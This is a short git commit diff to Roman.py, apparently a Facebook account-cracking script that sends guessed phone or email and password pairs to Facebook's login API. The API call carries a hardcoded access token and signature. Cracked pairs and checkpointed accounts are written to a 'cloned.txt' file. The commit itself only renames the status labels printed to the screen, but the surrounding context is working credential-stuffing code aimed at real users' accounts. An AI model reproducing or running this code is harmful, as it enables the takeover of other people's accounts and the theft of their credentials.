8a85c4f3e85a240077bdfc343ec6e7dd7e982f86
Hassam <75172510+Hassoo786@users.noreply.github.com>
2020-11-29 21:01:20 +0500

    Update Roman.py

--- Roman.py
+++ Roman.py
@@ -303,14 +303,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;93m(Free)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m(After 7 days) ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
